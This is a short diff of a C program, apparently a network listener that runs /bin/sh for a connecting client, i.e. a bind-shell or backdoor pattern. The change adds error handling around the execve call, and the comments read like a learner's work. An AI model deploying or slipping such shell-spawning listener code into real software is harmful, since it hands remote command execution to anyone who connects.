@@ -76,7 +76,11 @@ int main(void)
         // I had to add these empty string as NULL to execve since it was giving error when passing NULL as second and third argument directly.
         char *arg1[] = {NULL};
         char *arg2[] = {NULL};
-        execve("/bin/sh", arg1, arg2);
+        if (execve("/bin/sh", arg1, arg2) == -1)
+        {
+            printf("Error on execve: %s\n", strerror(errno));
+            return 1;
+        }
 
         // This inet_ntop() is used to convert the binary representation of IP address to string.
         inet_ntop(client_addr.sin_family, (struct inaddr *) &client_addr.sin_addr, ip_addr, INET_ADDRSTRLEN);
